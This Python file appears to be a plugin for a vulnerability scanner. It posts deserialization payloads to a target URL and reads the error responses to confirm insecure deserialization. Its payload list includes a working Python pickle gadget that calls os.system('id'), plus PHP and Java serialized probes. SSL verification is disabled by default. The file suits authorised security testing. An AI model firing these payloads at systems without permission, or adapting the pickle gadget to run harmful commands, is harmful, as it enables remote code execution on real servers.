"""
Insecure Deserialization Exploit Plugin

Provides exploit capabilities for deserialization vulnerabilities:
- Java (ysoserial-style) gadget chain payloads
- Python pickle exploitation payloads
- PHP unserialize exploitation
- .NET deserialization payloads
"""

import sys
import os
import base64
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

# Minimal Python pickle payload that executes `id` (safe PoC)
# Actual exploitation would use ysoserial/custom gadget chains
_PICKLE_POC_B64 = base64.b64encode(
    b'\x80\x04\x95(\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system'
    b'\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
).decode()

# PHP unserialize gadget (harmless string)
_PHP_PAYLOAD = 's:4:"test";'

# Java Commons Collections serialized payload prefix (hex marker only for detection)
_JAVA_MARKER = 'aced0005'

_PAYLOADS = [
    _PICKLE_POC_B64,
    _PHP_PAYLOAD,
    f'O:8:"stdClass":0:{{}}',        # PHP object
    'rO0ABXNy',                       # Base64 Java serialized prefix
    'YToxOntzOjQ6InRlc3QiO3M6NDoiZGF0YSI7fQ==',  # PHP serialized array b64
]


class DeserializationPlugin(ExploitPlugin):
    """Insecure Deserialization exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'deserialization'

    @property
    def name(self) -> str:
        return 'Insecure Deserialization Exploit'

    @property
    def description(self) -> str:
        return 'Insecure Deserialization exploit: Java, Python pickle, PHP, .NET payloads.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return deserialization exploit payloads."""
        return list(_PAYLOADS)

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Probe endpoints with deserialization payloads and look for error indicators."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'deserialization',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        parameter = vulnerability_data.get('parameter')

        # Error indicators that suggest deserialization processing
        error_indicators = [
            'unserialize', 'deserializ', 'pickle', 'java.io', 'ClassNotFoundException',
            'InvalidClassException', 'StreamCorruptedException', 'NotSerializableException',
            'gadget', 'ysoserial',
        ]

        for payload in _PAYLOADS:
            try:
                if parameter:
                    resp = requests.post(
                        target_url,
                        data={parameter: payload},
                        timeout=timeout,
                        verify=verify_ssl,
                    )
                else:
                    resp = requests.post(
                        target_url,
                        data=payload,
                        headers={'Content-Type': 'application/x-java-serialized-object'},
                        timeout=timeout,
                        verify=verify_ssl,
                    )

                body_lower = resp.text.lower()
                matched = [ind for ind in error_indicators if ind.lower() in body_lower]
                if matched:
                    return {
                        'success': True,
                        'vulnerability_type': 'deserialization',
                        'payload': payload[:80],
                        'evidence': f'Deserialization error indicators found: {matched}',
                        'message': 'Insecure deserialization confirmed via error response',
                    }
            except Exception as e:
                logger.debug(f"Deserialization probe error (payload={payload[:30]!r}): {e}")

        return {
            'success': False,
            'error': 'No deserialization vulnerability confirmed',
            'vulnerability_type': 'deserialization',
        }
